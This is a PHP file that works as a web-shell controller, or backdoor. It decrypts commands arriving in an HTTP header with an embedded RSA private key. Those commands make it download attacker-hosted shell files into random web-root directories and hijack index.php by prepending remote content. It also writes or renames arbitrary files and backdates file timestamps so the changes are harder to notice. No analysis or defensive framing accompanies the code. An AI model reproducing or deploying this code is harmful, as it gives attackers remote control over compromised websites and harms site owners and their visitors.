<?php
error_reporting(0);
class ErrorCode
{
    const E_200400 = 200400;
}
class MsgText
{
    const PARAM_EMPTY = 'param is empty';
    const PARAM_TYPE = 'param type error';
    const VALUE_ERROR = 'value error';
    const NOCHANGE = 'no change';
    const LOCK_FILE_SUCCESS = 'generate lock file success,but lock index.php error';
    const LOCK_FILE_ERROR = 'generate lock file error';
    const REMOTE_GET_ERROR = 'get remote content error';
    const LOCAL_FILE_ERROR = 'generate local file error';
    const SUCCESS = 'success';
    const LOCAL_FILE_EXISTS = 'local file doesn\'t exist';
    const REMOTE_FILE_EXISTS = 'remote file doesn\'t exist';
    const RENAME_ERROR = 'rename error';
    const INDEX_ERROR = 'index hijack error';
    const UNKNOWN_ERROR = 'unknown error';
    const DECRYPT_FAIL = 'params decrypt fail';
}
function error($msg = MsgText::UNKNOWN_ERROR, $extras = [], $code = 0)
{
    empty($code) && $code = ErrorCode::E_200400;
    exit(@json_encode(['code' => $code, 'msg' => $msg, 'extras' => $extras], JSON_UNESCAPED_UNICODE));
}
function success($data)
{
    exit(@json_encode(['code' => 200, 'msg' => MsgText::SUCCESS, 'data' => $data], JSON_UNESCAPED_UNICODE));
}
function getDirPathsByLevel($level = 6)
{
    $initDir = $_SERVER['DOCUMENT_ROOT'];
    $dirs = array($initDir);
    $count = count($dirs);
    while (count($dirs) > ($count - 1)) {
        $path = $dirs[($count - 1)];
        $count += 1;
        if (@is_dir($path) && @$handle = @opendir($path)) {
            while ($file = @readdir($handle)) {
                $realpath = $path . '/' . $file;
                if ($file == '.' || $file == '..' || !is_dir($realpath) || substr($file, 0, 1) === '.') {
                    continue;
                }
                $path3 = str_replace($initDir, "", $path);
                $path4 = explode("/", $path3);
                if (count($path4) > $level - 1) {
                    continue;
                }
                $dirs[] = $realpath;
            }
        }
        @closedir($handle);
    }
    return $dirs;
}
function getUrl($url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_TIMEOUT, 5);
    curl_setopt($curl, CURLOPT_AUTOREFERER, 0);
    curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
    if ($httpCode === 200) {
        $content = curl_exec($curl);
        return ['code' => 200, 'resp' => $content];
    }
    return ['code' => 500, 'resp' => ''];
}
function getRemoteContent($url)
{
    $content = @file_get_contents($url);
    if ($content === false) {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_TIMEOUT, 5);
        curl_setopt($curl, CURLOPT_AUTOREFERER, 0);
        $content = curl_exec($curl);
        curl_close($curl);
    }
    return !empty($content) && is_string($content) ? $content : '';
}
function copyfile($content, $localfile, $isAppend = false, $appendContent = '')
{
    if ($isAppend && !empty($appendContent)) {
        $content = trim($content);
        if (substr($content, -2, 2) !== '?>') {
            $content .= ' ?>';
        }
        $content = $content . PHP_EOL . PHP_EOL . $appendContent;
    }
    @file_put_contents($localfile, $content);
    if (!file_exists($localfile)) {
        $openedfile = @fopen($localfile, "w");
        @fwrite($openedfile, $content);
        @fclose($openedfile);
    }
    if (!file_exists($localfile)) {
        return false;
    }
    return true;
}
function updateFiletime($filepath)
{
    $ctime = filectime($filepath);
    $now = time();
    if (!($now > $ctime + 31104000)) {
        $newTime = $now - (mt_rand(15552000, 31104000));
        touch($filepath, $newTime, $newTime);
        return true;
    }
    return true;
}
$privateKey = '-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC30w49ItOfldQ6
dB+0gEbeeW6BEClcx+NZzmpX2YcRHFV80BurCWBavPFehV8Sy9yL2u/y3mv3QJJ+
x2kKvly8zKx4GbXPbsWJk6Ho0Rxq49oXkBarQBOqROZeaFF3Mzpd/PdLSsxEvG1M
tQd2wOx5r6XD86jyfN7LAJUUVvbJvn1CHo03nFH12k1KYwLnQfzQI5nX7yQLa0jt
fG5TA34Fm0EMbFdHWjAN/VdEjoJI6it4PCQP5wk4ga2BvVquQkuPbsbr8364d3I6
GuGAKDR0wfkT20n0E6kAmDI3ol2bfa0rQncqUS3OU3INpxOZS8eKCIgC3bM81mdi
MQ6TsAQ9AgMBAAECggEAJLGSlA2RpLdpx8lKUuOQQfSHZGfveb/E2DZl7+dSGM5J
GkMIYtnaTAKPQ8jns37SJXCsmRRhBNf05i20ABsDtAQ/ITIwopmAAPhhR3IGdCfL
bwyqGcEOq9xZB9tW965YJk7KplLl94qNXtR8Cu5zxc6UDktjHBRk/Ky/FXJOjPKM
sA8rhox7dqlZUB3I/qiqrQOgT1Bsq1BFT+2GGwRUWZ1CyFoZvhsDomdo4yhRrB0b
8Ym4MDiVqxFPVW8XB9RFD9YKt+v50Eb6iSKJNLpRmjZDNZbrEYO6NRsRBM7brDa9
n39mZWFr47wGGXXv/NhwTvRI+2Si/ZfdP4+o5TeSWQKBgQDhIVOUODisiLhk7XKb
Yu7BW1ZFcK0JxurqHN22msvA0Q/1q4RvziETjekXIn9lVKCmS/gy2O2RtuQRulAR
fc3sz2W9tNXRF8Avy0728NG0baOOwBalO8w3cCX6Nnm70pJer+iJSn3tmAKSB4LT
vbSB8pt6QgP8NPHyQdWp2LwOtwKBgQDRB8lgSaImIMJBaXERSaoNg8kxv3/cv4g5
jUlljxNQcUsj0V7XilnB3mFxq5rHjBZTsKzMMQyvhOxYhptDfw6OLtoPUk2WiBUs
l3qU0tIXNN+cTxu2SMKTjwMktkpmACJqa+k27eEUqxrKO/6SEiP9FMXHvgA4EEBM
Hww1eU9QqwKBgAWSY5Uphw2OHLIyxkFeQ3Z5ojr5vO6fA7VjnYEld6GACxsTcaWq
vlrTik9ORUTmwUscWjo38DlJA4AE0nJ8YJpZz7TQQvJ32gPUzlGCSE5k4EVqL6VL
Q5Sjq+zzaDPj1EePpvuu4kr9FiMzGGPRMCR/MqXl+F9HmC1cv8MCYDUlAoGBAK77
g7pVKaYdWkCD0iEUt4Rkw/IfSxwyQglbmwungBWhIbO0O17X9Fd0n8IWU5WkUbRx
e9XbYbE05t0cobEZFcg0tFqLHWRcOs1/aSBYc4L1whMJrjskIa6A07LR3uoQRr8r
4qkW7YrtyZluK6eABByCXSbeiTRldk3C1+eTy6/NAoGAb9/J+NWrhYSr/VoGWjui
chXCNszy4w6exVwxXQKNTtlzKxyhQfVPK2BxrptWL6KCRKpz3wh+WY2C3QYyVfwG
FB4hwDr2mY4TWF9pD194iES1yhrQGlI8XM+2LVhBl3p0x+TFgJMaTgDDqAnxpuqT
upBYqTYMlOd+VR7hENMaFqo=
-----END PRIVATE KEY-----';
$p = $_SERVER['HTTP_P'];
$params = openssl_private_decrypt(base64_decode(urldecode($p)), $decrypted, $privateKey) ? $decrypted : null;
if (is_null($params)) {
    error(MsgText::DECRYPT_FAIL);
}
$params = json_decode($params, true);
if (!is_array($params)) {
    error(MsgText::PARAM_TYPE, $params);
}
if (empty($params['server'])) {
    error('server ' . MsgText::PARAM_EMPTY);
}
if (empty($params['iden'])) {
    error('iden ' . MsgText::PARAM_EMPTY);
}
$iden = isset($params['iden']) ? strtolower($params['iden']) : '';
switch ($iden) {
    case "beima":
        $res = doBeima($params);
        break;
    case "rename":
        $res = doRename($params);
        break;
    case "index":
        $res = doIndex($params);
        break;
    case "sub":
    case "htaccess":
        $res = doSub($params);
        break;
    case "lock":
        $res = doLock($params);
        break;
    case "style":
        $res = doStyle($params);
        break;
    default:
        error('iden ' . MsgText::VALUE_ERROR);
}
function doBeima($params)
{
    if (empty($params['filename'])) {
        error('filename ' . MsgText::PARAM_EMPTY, $params);
    }
    if (empty($params['shellfile'])) {
        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
    }
    empty($params['level']) && $params['level'] = 6;
    $dirs = getDirPathsByLevel($params['level']);
    $temp = array_rand($dirs);
    $createDir = $dirs[$temp] . '/';
    $localfilepath = $createDir . $params['filename'];
    $remoteFileUrl = $params['server'] . $params['shellfile'];
    $content = getRemoteContent($remoteFileUrl);
    $content = json_decode($content, true);
    if (!empty($content['result'])) {
        if (copyfile($content['result'], $localfilepath)) {
            updateFiletime($localfilepath);
            $beimaurl = str_replace($_SERVER['DOCUMENT_ROOT'], '', $localfilepath);
            success(compact('localfilepath', 'beimaurl'));
        }
        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
    }
    error(MsgText::REMOTE_FILE_EXISTS, compact('remoteFileUrl'));
}
function doRename($params)
{
    if (empty($params['sourcename'])) {
        error('sourcename ' . MsgText::PARAM_EMPTY, $params);
    }
    if (empty($params['rename'])) {
        error('rename ' . MsgText::PARAM_EMPTY, $params);
    }
    if ($params['sourcename'] === $params['rename']) {
        error(MsgText::NOCHANGE);
    }
    $sourceFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params['sourcename'];
    $renameFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params['rename'];
    $resSource = $params['server'] . str_replace(strtolower($_SERVER['DOCUMENT_ROOT']), '', strtolower($sourceFile));
    $resSource = str_replace('\\', '/', $resSource);
    if (file_exists($sourceFile)) {
        if (rename($sourceFile, $renameFile)) {
            success($renameFile);
        } else {
            error(MsgText::RENAME_ERROR, compact('renameFile'));
        }
    } else {
        error(MsgText::LOCAL_FILE_EXISTS, compact('resSource'));
    }
}
function doIndex($params)
{
    if (empty($params['shellfile'])) {
        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
    }
    $remoteUrl = $params['server'] . trim($params['shellfile']);
    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/index.php';
    $content = getRemoteContent($remoteUrl);
    $content = json_decode($content, true);
    if (!empty($content['result'])) {
        $oldContent = '';
        if (file_exists($localfilepath)) {
            $oldContent = @file_get_contents($localfilepath);
        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/index.html')) {
            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/index.html');
        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/index.htm')) {
            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/index.htm');
        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/default.html')) {
            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/default.html');
        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/default.htm')) {
            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/default.htm');
        }
        if (copyfile($content['result'], $localfilepath, true, $oldContent)) {
            updateFiletime($localfilepath);
            @chmod($localfilepath, 0644);
            success($localfilepath);
        }
        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
    }
    error(MsgText::INDEX_ERROR, compact('remoteUrl'));
}
function doSub($params)
{
    if (empty($params['shellfile'])) {
        error('shellfile' . MsgText::PARAM_EMPTY, $params);
    }
    if (empty($params['filename'])) {
        error('filename ' . MsgText::PARAM_EMPTY, $params);
    }
    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/' . $params['filename'];
    $remoteFileUrl = $params['server'] . $params['shellfile'];
    $content = getRemoteContent($remoteFileUrl);
    $content = json_decode($content, true);
    if (!empty($content['result'])) {
        if (copyfile($content['result'], $localfilepath)) {
            updateFiletime($localfilepath);
            @chmod($localfilepath, 0644);
            success($localfilepath);
        }
        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
    }
    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
}
function doLock($params)
{
    if (empty($params['filename'])) {
        error('filename ' . MsgText::PARAM_EMPTY, $params);
    }
    if (empty($params['domain'])) {
        error('domain ' . MsgText::PARAM_EMPTY, $params);
    }
    if (empty($params['shellfile'])) {
        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
    }
    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/' . $params['filename'];
    $remoteFileUrl = $params['server'] . $params['shellfile'];
    $content = getRemoteContent($remoteFileUrl);
    $content = json_decode($content, true);
    if (!empty($content['result'])) {
        if (copyfile($content['result'], $localfilepath)) {
            $lockurl = $params['domain'] . $params['filename'];
            $lockres = getUrl($lockurl);
            @unlink($localfilepath);
            if ($lockres['code'] === 200 && !empty($lockres['resp']) && strpos($lockres['resp'], 'success')) {
                success($lockres['resp']);
            }
            error(MsgText::LOCK_FILE_SUCCESS, compact('lockurl', 'lockres'));
        }
        @unlink($localfilepath);
        error(MsgText::LOCK_FILE_ERROR, compact('localfilepath'));
    }
    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
}
function doStyle($params)
{
    if (empty($params['shellfile'])) {
        error('shellfile' . MsgText::PARAM_EMPTY, $params);
    }
    if (empty($params['filename'])) {
        error('filename ' . MsgText::PARAM_EMPTY, $params);
    }
    if (empty($params['domain'])) {
        error('domain ' . MsgText::PARAM_EMPTY, $params);
    }
    $localfilepath = $params['domain'] . $params['filename'];
    $remoteFileUrl = $params['server'] . $params['shellfile'];
    $content = getRemoteContent($remoteFileUrl);
    $content = json_decode($content, true);
    if (!empty($content['result'])) {
        if (copyfile($content['result'], $localfilepath)) {
            updateFiletime($localfilepath);
            @chmod($localfilepath, 0644);
            success($localfilepath);
        }
        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
    }
    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
}